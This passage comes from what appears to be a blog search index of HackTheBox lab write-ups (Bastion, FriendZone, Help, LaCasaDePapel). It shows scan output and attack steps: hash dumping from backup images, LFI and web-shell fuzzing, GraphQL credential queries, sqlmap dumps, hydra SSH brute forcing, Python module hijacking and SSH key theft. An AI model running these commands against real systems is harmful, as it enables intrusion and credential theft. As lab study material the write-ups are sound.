23:58:45 1600 Winsock2\\CatalogChangeListener-364-0 fr--r--r-- 3 Sun Dec 31 23:58:45 1600 trkwks fr--r--r-- 3 Sun Dec 31 23:58:45 1600 spoolss fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-66c-0 fr--r--r-- 3 Sun Dec 31 23:58:45 1600 W32TIME_ALT fr--r--r-- 1 Sun Dec 31 23:58:45 1600 openssh-ssh-agent fr--r--r-- 4 Sun Dec 31 23:58:45 1600 srvsvc fr--r--r-- 1 Sun Dec 31 23:58:45 1600 vgauth-service fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-5ec-0 fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-264-0 fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-26c-0 Foothold Let\u0026rsquo;s check the note.txt We see 2 vhd files, let\u0026rsquo;s check them apt install guestmount - so we can mount vhd mount -t cifs //10.10.10.134/backups /mnt -o user=,password= guestmount --add /mnt/smb/WindowsImageBackup/L4mpje-PC/Backup\\ 2019-02-22\\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/disk Go to Windows/System32/config and dump the hashes Crack the hashes Connect to ssh Root Let\u0026rsquo;s enumerate Let\u0026rsquo;s check installed software We see mRemoteNG Let\u0026rsquo;s find it\u0026rsquo;s config file: confCons.xml According to docs it should be located in %AppData%\\mRemoteNG Let\u0026rsquo;s open it Decypher the password using mRemoteNG Decrypt And connect via ssh ","date":"June 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/bastion/images/bastion.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/bastion/","summary":"Bastion Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.10.134 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 21:20 BST Nmap scan report for 10.10.10.134 (10.10.10.134) Host is up (0.13s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a56ae753c780ec8564dcb1c22bf458a (RSA) | 256 cc2e56ab1997d5bb03fb82cd63da6801 (ECDSA) |_ 256 935f5daaca9f53e7f282e664a8a3a018 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-06-17T20:20:50 |_ start_date: 2023-06-17T18:27:22 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: -40m29s, deviation: 1h09m15s, median: -30s | smb2-security-mode: | 311: |_ Message signing enabled but not required | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.","tags":["HTB"],"title":"[HTB] Machine: Bastion"},{"categories":null,"contents":"FriendZone Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.10.123 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-18 15:55 BST Nmap scan report for 10.10.10.123 (10.10.10.123) Host is up (0.13s latency). Not shown: 993 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a96824bc971f1e54a58045e74cd9aaa0 (RSA) | 256 e5440146ee7abb7ce91acb14999e2b8e (ECDSA) |_ 256 004e1a4f33e8a0de86a6e42a5f84612b (ED25519) 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Friend Zone Escape software 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http Apache httpd 2.4.29 | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO | Not valid before: 2018-10-05T21:02:30 |_Not valid after: 2018-11-04T21:02:30 |_http-server-header: Apache/2.4.29 (Ubuntu) |_ssl-date: TLS randomness does not represent time |_http-title: 404 Not Found 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: -1h00m29s, deviation: 1h43m54s, median: -30s | smb2-time: | date: 2023-06-18T14:55:52 |_ start_date: N/A | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 000000000000 (Xerox) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: friendzone | NetBIOS computer name: FRIENDZONE\\x00 | Domain name: \\x00 | FQDN: friendzone |_ System time: 2023-06-18T17:55:53+03:00 | smb2-security-mode: | 311: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 40.94 seconds smbmap └─$ smbmap -H 10.10.10.123 -R [+] Guest session IP: 10.10.10.123:445 Name: 10.10.10.123 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers Files NO ACCESS FriendZone Samba Server Files /etc/Files general READ ONLY FriendZone Samba Server Files .\\general\\* dr--r--r-- 0 Wed Jan 16 20:10:51 2019 . dr--r--r-- 0 Tue Sep 13 15:56:24 2022 .. fr--r--r-- 57 Wed Oct 10 00:52:42 2018 creds.txt Development READ, WRITE FriendZone Samba Server Files .\\Development\\* dr--r--r-- 0 Sun Jun 18 16:10:05 2023 . dr--r--r-- 0 Tue Sep 13 15:56:24 2022 .. IPC$ NO ACCESS IPC Service (FriendZone server (Samba, Ubuntu)) Creds Web server gobuster dig axfr Foothold https://administrator1.friendzone.red/ Use the creds from smb Let\u0026rsquo;s test params It seems like image_id provides nothing Let\u0026rsquo;s try pagename It seems like it appends .php to parameter Let\u0026rsquo;s get source code Used CyberChef for decoding We can have a LFI We had a read, write permissions on Development share Maybe we can put our web-shell, but we have to find the location of the Development folder Let\u0026rsquo;s upload a web-shell and search for it Let\u0026rsquo;s generate wordlist for root directories And use it for fuzzing wfuzz -c -w ./root_dirs -H 'Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' 'https://administrator1.friendzone.red/dashboard.php?image_id=\u0026amp;pagename=../../..FUZZ/Development/shell\u0026amp;cmd=id' And we find the location, which is /etc Let\u0026rsquo;s check Time to get our reverse-shell User Upload and run linpeas Let\u0026rsquo;s check mysql_data.conf Try su - friend in case of cred reuse Root Let\u0026rsquo;s check /opt/server_admin We see that this job is automated We see a writable module os.py, which is included in the script above We can hijack it according to this post Check the python path order We see the first line is blank, which is according to the post is the Directory of the script being executed We can try creating os.py there or simply add payload to existing os.py since we can write to it Let\u0026rsquo;s simply add payload to existing file Set up listener and for connection ","date":"June 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/friendzone/images/friendzone.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/friendzone/","summary":"FriendZone Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.10.123 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-18 15:55 BST Nmap scan report for 10.10.10.123 (10.10.10.123) Host is up (0.13s latency). Not shown: 993 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a96824bc971f1e54a58045e74cd9aaa0 (RSA) | 256 e5440146ee7abb7ce91acb14999e2b8e (ECDSA) |_ 256 004e1a4f33e8a0de86a6e42a5f84612b (ED25519) 53/tcp open domain ISC BIND 9.","tags":["HTB"],"title":"[HTB] Machine: FriendZone"},{"categories":null,"contents":"Help Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.121 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 18:37 BST Nmap scan report for 10.10.10.121 (10.10.10.121) Host is up (0.16s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e5bb4d9cdeaf6bbfba8c227ad8d74328 (RSA) | 256 d5b010507486a39fc5536f3b4a246119 (ECDSA) |_ 256 e21b88d37621d41e38154a8111b79907 (ED25519) 80/tcp open http Apache httpd 2.4.18 |_http-title: Did not follow redirect to http://help.htb/ |_http-server-header: Apache/2.4.18 (Ubuntu) 3000/tcp open http Node.js Express framework |_http-title: Site doesn\u0026#39;t have a title (application/json; charset=utf-8). Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 42.49 seconds gobuster └─$ gobuster dir -u http://help.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,html,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://help.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: html,txt,php [+] Timeout: 10s =============================================================== 2023/06/20 17:43:00 Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 287] /.html (Status: 403) [Size: 288] /index.html (Status: 200) [Size: 11321] /support (Status: 301) [Size: 306] [--\u0026gt; http://help.htb/support/] /javascript (Status: 301) [Size: 309] [--\u0026gt; http://help.htb/javascript/] Web server Port 3000 If we check the response headers It\u0026rsquo;s says powered by Express If we google about Express and it\u0026rsquo;s query language we see GraphQL Foothold Let\u0026rsquo;s enumerate GraphQL Docs Query all information regarding types We see that we have user query User type with username and password fields └─$ curl -s 10.10.10.121:3000/graphql -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#39;{ \u0026#34;query\u0026#34;: \u0026#34;{ __schema { types { name, fields { name, description } } } }\u0026#34; }\u0026#39; | jq { \u0026#34;data\u0026#34;: { \u0026#34;__schema\u0026#34;: { \u0026#34;types\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Query\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34; } ] }, { \u0026#34;name\u0026#34;: \u0026#34;User\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;username\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;password\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34; } ] }, { \u0026#34;name\u0026#34;: \u0026#34;String\u0026#34;, \u0026#34;fields\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;__Schema\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;types\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;A list of all types supported by this server.\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;queryType\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;The type that query operations will be rooted at.\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;mutationType\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;If this server supports mutation, the type that mutation operations will be rooted at.\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;subscriptionType\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;If this server support subscription, the type that subscription operations will be rooted at.\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;directives\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;A list of all directives supported by this server.\u0026#34; } ] }, { \u0026#34;name\u0026#34;: \u0026#34;__Type\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;kind\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;name\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;description\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;fields\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;interfaces\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;possibleTypes\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;enumValues\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;inputFields\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;ofType\u0026#34;, \u0026#34;description\u0026#34;: null } ] }, { \u0026#34;name\u0026#34;: \u0026#34;__TypeKind\u0026#34;, \u0026#34;fields\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;Boolean\u0026#34;, \u0026#34;fields\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;__Field\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;name\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;description\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;args\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;type\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;isDeprecated\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;deprecationReason\u0026#34;, \u0026#34;description\u0026#34;: null } ] }, { \u0026#34;name\u0026#34;: \u0026#34;__InputValue\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;name\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;description\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;type\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;defaultValue\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;A GraphQL-formatted string representing the default value for this input value.\u0026#34; } ] }, { \u0026#34;name\u0026#34;: \u0026#34;__EnumValue\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;name\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;description\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;isDeprecated\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;deprecationReason\u0026#34;, \u0026#34;description\u0026#34;: null } ] }, { \u0026#34;name\u0026#34;: \u0026#34;__Directive\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;name\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;description\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;locations\u0026#34;, \u0026#34;description\u0026#34;: null }, { \u0026#34;name\u0026#34;: \u0026#34;args\u0026#34;, \u0026#34;description\u0026#34;: null } ] }, { \u0026#34;name\u0026#34;: \u0026#34;__DirectiveLocation\u0026#34;, \u0026#34;fields\u0026#34;: null } ] } } } user query returns User type └─$ curl -s 10.10.10.121:3000/graphql -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#39;{ \u0026#34;query\u0026#34;: \u0026#34;{ __schema { queryType { name, fields { name, description, args {name}, type {name} } } } }\u0026#34; }\u0026#39; | jq { \u0026#34;data\u0026#34;: { \u0026#34;__schema\u0026#34;: { \u0026#34;queryType\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;Query\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;args\u0026#34;: [], \u0026#34;type\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;User\u0026#34; } } ] } } } } Let\u0026rsquo;s query └─$ curl -s 10.10.10.121:3000/graphql -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#39;{ \u0026#34;query\u0026#34;: \u0026#34;{ user { username password } }\u0026#34; }\u0026#39; | jq { \u0026#34;data\u0026#34;: { \u0026#34;user\u0026#34;: { \u0026#34;username\u0026#34;: \u0026#34;helpme@helpme.com\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;5d3c93182bb20f07b994a7f617e99cff\u0026#34; } } } Crack the hash Let\u0026rsquo;s find a place where we can use those credentials We saw support endpoint in gobuster results let\u0026rsquo;s open it Use the creds It\u0026rsquo;s a HelpDeskZ Let\u0026rsquo;s find the version We have 2 possible exploits related to version \u0026lt;= 1.0.2 The older version of HelpDeskZ have a readme.html file Github Let\u0026rsquo;s check SQL Injection We have to follow the steps specified in the exploit Create a ticket Open a ticket and check the attachment link In my case: http://help.htb/support/?v=view_tickets\u0026amp;action=ticket\u0026amp;param[]=4\u0026amp;param[]=attachment\u0026amp;param[]=1\u0026amp;param[]=6 Open Burp Suite and click the attachment link Copy to file the request Let\u0026rsquo;s launch sqlmap sqlmap -r help.req --level 5 --risk 3 -p param[] --dump or you can dump specific table: sqlmap -r help.req --level 5 --risk 3 -p param[] --dump -D support -T staff And we get the results We have our password, let\u0026rsquo;s try with different usernames We can use hydra hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p 'Welcome1' ssh://10.10.10.121 Root Let\u0026rsquo;s enumerate for privesc The kernel version is 4.4.-116-generic Exploit Download and compile it Upload to server and run First, I compiled it on my own machine and uploaded, but it didn\u0026rsquo;t work since the versions of glibc were different Then, I simply uploaded the source code, knowing I had gcc on the box, compiled it and ran it ","date":"June 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/help/images/help.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/help/","summary":"Help Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.121 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 18:37 BST Nmap scan report for 10.10.10.121 (10.10.10.121) Host is up (0.16s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e5bb4d9cdeaf6bbfba8c227ad8d74328 (RSA) | 256 d5b010507486a39fc5536f3b4a246119 (ECDSA) |_ 256 e21b88d37621d41e38154a8111b79907 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: Help"},{"categories":null,"contents":"LaCasaDePapel Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.131 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 16:13 BST Nmap scan report for 10.10.10.131 (10.10.10.131) Host is up (0.19s latency). Not shown: 982 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 7.9 (protocol 2.0) | ssh-hostkey: | 2048 03e1c2c9791ca66b51348d7ac3c7c850 (RSA) | 256 41e495a3390b25f9dadebe6adc59486d (ECDSA) |_ 256 300bc6662b8f5e4f2628750ef5b171e4 (ED25519) 80/tcp open http Node.js (Express middleware) |_http-title: La Casa De Papel 119/tcp filtered nntp 443/tcp open ssl/http Node.js Express framework |_http-title: La Casa De Papel | tls-nextprotoneg: | http/1.1 |_ http/1.0 | ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel | Not valid before: 2019-01-27T08:35:30 |_Not valid after: 2029-01-24T08:35:30 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Server returned status 401 but no WWW-Authenticate header. 1065/tcp filtered syscomlan 1084/tcp filtered ansoft-lm-2 1112/tcp filtered msql 1914/tcp filtered elm-momentum 2034/tcp filtered scoremgr 2119/tcp filtered gsigatekeeper 4444/tcp filtered krb524 7000/tcp filtered afs3-fileserver 15660/tcp filtered bex-xr 19350/tcp filtered unknown 20031/tcp filtered unknown 34571/tcp filtered unknown 52869/tcp filtered unknown Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 80.58 seconds Web Server Foothold vsftpd 2.3.4 Exploit Let\u0026rsquo;s run it It\u0026rsquo;s a psy If we ran phpinfo(), we see that there is a list of disabled functions User I tried opening users\u0026rsquo; home directories and their .ssh folder, but had no success Found ca.key We can use openssl to check TLS configurations └─$ openssl s_client -connect 10.10.10.131:443 CONNECTED(00000003) Can\u0026#39;t use SSL_get_servername depth=0 CN = lacasadepapel.htb, O = La Casa De Papel verify error:num=18:self-signed certificate verify return:1 depth=0 CN = lacasadepapel.htb, O = La Casa De Papel verify return:1 --- Certificate chain 0 s:CN = lacasadepapel.htb, O = La Casa De Papel i:CN = lacasadepapel.htb, O = La Casa De Papel a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256 v:NotBefore: Jan 27 08:35:30 2019 GMT; NotAfter: Jan 24 08:35:30 2029 GMT --- Server certificate -----BEGIN CERTIFICATE----- MIIC6jCCAdICCQDISiE8M6B29jANBgkqhkiG9w0BAQsFADA3MRowGAYDVQQDDBFs YWNhc2FkZXBhcGVsLmh0YjEZMBcGA1UECgwQTGEgQ2FzYSBEZSBQYXBlbDAeFw0x OTAxMjcwODM1MzBaFw0yOTAxMjQwODM1MzBaMDcxGjAYBgNVBAMMEWxhY2FzYWRl cGFwZWwuaHRiMRkwFwYDVQQKDBBMYSBDYXNhIERlIFBhcGVsMIIBIjANBgkqhkiG 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3M6VN7OD5sHW+zCbIv/5vJpuaxJF3A5q2rV QJNqU1sFsbnaPxRbFgAtc8hVeMNii2nCFO8PGGs9P9pvoy8e8DR9ksBQYyXqOZZ8 /rsdxwfjYVgv+a3UbJNO4e9Sd3b8GL+4XIzzSi3EZbl7dlsOhl4+KB4cM4hNhE5B 4K8UKe4wfKS/ekgyCRTRENVqqd3izZzz232yyzFvDGEOFJVzmhlHVypqsfS9rKUV ESPHczaEQld3kupVrt/mBqwuKe99sluQzORqO1xMqbNgb55ZD66vQBSkN2PwBeiR PBRNXfnWla3Gkabukpu9xR9o+l7ut13PXdQ/fPflLDwnu5wMZwIDAQABMA0GCSqG SIb3DQEBCwUAA4IBAQCuo8yzORz4pby9tF1CK/4cZKDYcGT/wpa1v6lmD5CPuS+C hXXBjK0gPRAPhpF95DO7ilyJbfIc2xIRh1cgX6L0ui/SyxaKHgmEE8ewQea/eKu6 vmgh3JkChYqvVwk7HRWaSaFzOiWMKUU8mB/7L95+mNU7DVVUYB9vaPSqxqfX6ywx BoJEm7yf7QlJTH3FSzfew1pgMyPxx0cAb5ctjQTLbUj1rcE9PgcSki/j9WyJltkI EqSngyuJEu3qYGoM0O5gtX13jszgJP+dA3vZ1wqFjKlWs2l89pb/hwRR2raqDwli MgnURkjwvR1kalXCvx9cST6nCkxF2TxlmRpyNXy4 -----END CERTIFICATE----- subject=CN = lacasadepapel.htb, O = La Casa De Papel issuer=CN = lacasadepapel.htb, O = La Casa De Papel --- Acceptable client certificate CA names CN = lacasadepapel.htb, O = La Casa De Papel Client Certificate Types: RSA sign, DSA sign, ECDSA sign Requested Signature Algorithms: RSA+SHA512:DSA+SHA512:ECDSA+SHA512:RSA+SHA384:DSA+SHA384:ECDSA+SHA384:RSA+SHA256:DSA+SHA256:ECDSA+SHA256:RSA+SHA224:DSA+SHA224:ECDSA+SHA224:RSA+SHA1:DSA+SHA1:ECDSA+SHA1 Shared Requested Signature Algorithms: RSA+SHA512:DSA+SHA512:ECDSA+SHA512:RSA+SHA384:DSA+SHA384:ECDSA+SHA384:RSA+SHA256:DSA+SHA256:ECDSA+SHA256:RSA+SHA224:DSA+SHA224:ECDSA+SHA224:RSA+SHA1:DSA+SHA1:ECDSA+SHA1 Peer signing digest: SHA512 Peer signature type: RSA Server Temp Key: ECDH, prime256v1, 256 bits --- SSL handshake has read 1537 bytes and written 561 bytes Verification error: self-signed certificate --- New, TLSv1.2, Cipher is ECDHE-RSA-AES128-GCM-SHA256 Server public key is 2048 bit Secure Renegotiation IS supported Compression: NONE Expansion: NONE No ALPN negotiated SSL-Session: Protocol : TLSv1.2 Cipher : ECDHE-RSA-AES128-GCM-SHA256 Session-ID: CB1545984AC48ABA22DD66B3232679DE2FD4EE27366D7CA1F7C0CD415F2721D7 Session-ID-ctx: Master-Key: C377D9A9FF84789464AC768D8EA03AA3EB6AB15CA746294C683E050C4AB21C3F679953885BF25CEB256E03BC59B97EE4 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 300 (seconds) TLS session ticket: 0000 - fa 80 99 68 e5 6a 75 04-a9 f0 4d bc 3f 88 98 bf ...h.ju...M.?... 0010 - 78 59 49 13 72 6a c4 d7-39 ad b3 0c da bc 5c c2 xYI.rj..9.....\\. 0020 - ce f9 39 99 eb 05 0d dc-cf 79 87 60 6b 98 98 67 ..9......y.`k..g 0030 - 7e 6d b3 ba 60 8a af 32-cc 6b cd 69 a1 be 4c 42 ~m..`..2.k.i..LB 0040 - 95 1f a6 2b 31 03 84 6c-7b 60 71 a6 c9 2d 17 e0 ...+1..l{`q..-.. 0050 - 67 21 af 52 27 47 3d 07-f0 d8 67 b1 76 c5 86 86 g!.R\u0026#39;G=...g.v... 0060 - 9f dd 35 aa 49 5b c2 e3-6e 42 20 33 a4 04 1f 4e ..5.I[..nB 3...N 0070 - cf 0a 29 3c 26 71 8d bd-42 f2 e4 d7 d1 83 54 2f ..)\u0026lt;\u0026amp;q..B.....T/ 0080 - a0 3a fa 1a ef 46 9b 38-38 69 d5 5d 60 0f 9f fa .:...F.88i.]`... 0090 - 6e 1f a0 57 14 97 eb 3b-b7 42 e4 d1 42 f0 97 77 n..W...;.B..B..w 00a0 - 75 09 22 d0 46 3a 1f 17-b4 86 63 c5 03 21 44 37 u.\u0026#34;.F:....c..!D7 00b0 - 98 de c1 f0 f8 7d fb b6-62 66 b5 d5 08 16 aa 40 .....}..bf.....@ Start Time: 1687192547 Timeout : 7200 (sec) Verify return code: 18 (self-signed certificate) Extended master secret: no --- Let\u0026rsquo;s generate pkcs12 certificate using ca\u0026rsquo;s key and certificate Import it to firefox Refresh the page and turn off Burp Suite Press Ok When opening SEASON-1 it redirects to https://10.10.10.131/?path=SEASON-1 Download any file Let\u0026rsquo;s grab ssh keys from all users, since we have lfi I only was able to download berlin\u0026rsquo;s id_rsa Let\u0026rsquo;s use to connect as any user Found a nice way to try each user from 0xdf: for user in berlin dali nairobi oslo professor; do ssh -oBatchMode=yes -i ~/id_rsa_lacasadepapel_berlin $user@10.10.10.131; done I had an issue with format of the key, so I downloaded it using curl: curl -k https://10.10.10.131/file/Li4vLnNzaC9pZF9yc2E= Don\u0026rsquo;t forget to set permissions to 600 Root We have a memcached.ini We see there is a process running as nobody Running pspy will tell you that there is a automated job running every few minutes So we can try changing the command, but we can\u0026rsquo;t since it\u0026rsquo;s owned by root But we can delete it and create a new one, since the directory is owned by professor Let\u0026rsquo;s delete and create a file And we have our root ","date":"June 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/lacasadepapel/images/lacasadepapel.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/lacasadepapel/","summary":"LaCasaDePapel Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.131 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 16:13 BST Nmap scan report for 10.10.10.131 (10.10.10.131) Host is up (0.19s latency). Not shown: 982 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 7.9 (protocol 2.0) | ssh-hostkey: | 2048 03e1c2c9791ca66b51348d7ac3c7c850 (RSA) | 256 41e495a3390b25f9dadebe6adc59486d (ECDSA) |_ 256 300bc6662b8f5e4f2628750ef5b171e4 (ED25519) 80/tcp open http Node.","tags":["HTB"],"title":"[HTB] Machine: LaCasaDePapel"},{"categories":null,"contents":"Netmon Enumeration nmap └─$ nmap -sC -sV -Pn -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.152 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 